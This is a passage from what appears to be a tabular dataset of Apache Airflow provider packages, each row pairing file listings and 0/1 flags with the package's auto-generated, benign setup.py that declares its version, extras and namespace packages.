# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-jdbc package.""""""

from setuptools import find_namespace_packages, setup

version = '3.2.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-jdbc setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(include=['airflow.providers.jdbc', 'airflow.providers.jdbc.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-jira-3.0.1,0,1,1,1,1,0,0,0,get_provider_info.py jira.py __init__.py jira.py __init__.py jira.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-jira package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.1'


def do_setup():
    """"""Perform the package apache-airflow-providers-jira setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.jira', 'airflow.providers.jira.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-microsoft-azure-4.2.0,0,1,1,1,1,0,0,0,get_provider_info.py adx.py asb.py azure_batch.py azure_container_instance.py azure_container_registry.py azure_container_volume.py azure_cosmos.py azure_data_factory.py azure_data_lake.py azure_fileshare.py base_azure.py batch.py container_instance.py container_registry.py container_volume.py cosmos.py data_factory.py data_lake.py fileshare.py wasb.py __init__.py wasb_task_handler.py __init__.py adls.py adls_delete.py adls_list.py adx.py asb.py azure_batch.py azure_container_instances.py azure_cosmos.py batch.py container_instances.py cosmos.py data_factory.py wasb_delete_blob.py __init__.py azure_key_vault.py key_vault.py __init__.py azure_cosmos.py cosmos.py data_factory.py wasb.py __init__.py azure_blob_to_gcs.py file_to_wasb.py local_to_adls.py local_to_wasb.py oracle_to_azure_data_lake.py sftp_to_wasb.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-microsoft-azure package.""""""

from setuptools import find_namespace_packages, setup

version = '4.2.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-microsoft-azure setup.""""""
    setup(
        version=version,
        extras_require={
            'google': ['apache-airflow-providers-google'],
            'oracle': ['apache-airflow-providers-oracle'],
            'sftp': ['apache-airflow-providers-sftp'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.microsoft.azure', 'airflow.providers.microsoft.azure.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-microsoft-mssql-3.2.0,0,1,1,1,1,0,0,0,get_provider_info.py mssql.py __init__.py mssql.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-microsoft-mssql package.""""""

from setuptools import find_namespace_packages, setup

version = '3.2.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-microsoft-mssql setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(
            include=['airflow.providers.microsoft.mssql', 'airflow.providers.microsoft.mssql.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-mongo-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py mongo.py __init__.py mongo.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-mongo package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-mongo setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.mongo', 'airflow.providers.mongo.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-mysql-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py mysql.py __init__.py mysql.py __init__.py presto_to_mysql.py s3_to_mysql.py trino_to_mysql.py vertica_to_mysql.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-mysql package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-mysql setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'presto': ['apache-airflow-providers-presto'],
            'trino': ['apache-airflow-providers-trino'],
            'vertica': ['apache-airflow-providers-vertica'],
        },
        packages=find_namespace_packages(include=['airflow.providers.mysql', 'airflow.providers.mysql.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-odbc-3.1.1,0,1,1,1,1,0,0,0,get_provider_info.py odbc.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-odbc package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.1'

def do_setup():
    """"""Perform the package apache-airflow-providers-odbc setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(include=['airflow.providers.odbc', 'airflow.providers.odbc.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-oracle-3.3.0,0,1,1,1,1,0,0,0,get_provider_info.py oracle.py __init__.py oracle.py __init__.py oracle_to_oracle.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-oracle package.""""""

from setuptools import find_namespace_packages, setup

version = '3.3.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-oracle setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql'], 'numpy': ['numpy']},
        packages=find_namespace_packages(include=['airflow.providers.oracle', 'airflow.providers.oracle.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-pagerduty-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py pagerduty.py pagerduty_events.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-pagerduty package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-pagerduty setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.pagerduty', 'airflow.providers.pagerduty.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-papermill-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py papermill.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-papermill package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-papermill setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.papermill', 'airflow.providers.papermill.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-postgres-5.1.0,0,1,1,1,1,0,0,0,get_provider_info.py postgres.py __init__.py postgres.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-postgres package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-postgres setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon'],
            'common.sql': ['apache-airflow-providers-common-sql'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.postgres', 'airflow.providers.postgres.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-redis-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py redis.py __init__.py redis_publish.py __init__.py redis_key.py redis_pub_sub.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-redis package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-redis setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.redis', 'airflow.providers.redis.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-salesforce-5.1.0,0,1,1,1,1,0,0,0,get_provider_info.py salesforce.py __init__.py bulk.py salesforce_apex_rest.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-salesforce package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-salesforce setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.salesforce', 'airflow.providers.salesforce.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-sendgrid-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py emailer.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sendgrid package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-sendgrid setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.sendgrid', 'airflow.providers.sendgrid.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-sftp-4.0.0,0,1,1,1,1,0,0,0,get_provider_info.py sftp.py __init__.py sftp.py __init__.py sftp.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sftp package.""""""

from setuptools import find_namespace_packages, setup

version = '4.0.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-sftp setup.""""""
    setup(
        version=version,
        extras_require={'ssh': ['apache-airflow-providers-ssh']},
        packages=find_namespace_packages(include=['airflow.providers.sftp', 'airflow.providers.sftp.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-slack-5.1.0,0,1,1,1,1,0,0,0,example_slack.py __init__.py get_provider_info.py slack.py slack_webhook.py __init__.py slack.py slack_webhook.py __init__.py sql_to_slack.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-slack package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-slack setup.""""""
    setup(
        version=version,
        extras_require={
            'common.sql': ['apache-airflow-providers-common-sql'],
            'http': ['apache-airflow-providers-http'],
        },
        packages=find_namespace_packages(include=['airflow.providers.slack', 'airflow.providers.slack.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-snowflake-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py snowflake.py __init__.py snowflake.py __init__.py s3_to_snowflake.py snowflake_to_slack.py __init__.py common.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-snowflake package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-snowflake setup.""""""
    setup(
        version=version,
        extras_require={
            'common.sql': ['apache-airflow-providers-common-sql'],
            'slack': ['apache-airflow-providers-slack'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.snowflake', 'airflow.providers.snowflake.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-sqlite-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py sqlite.py __init__.py sqlite.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sqlite package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-sqlite setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(include=['airflow.providers.sqlite', 'airflow.providers.sqlite.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-ssh-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py ssh.py __init__.py ssh.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
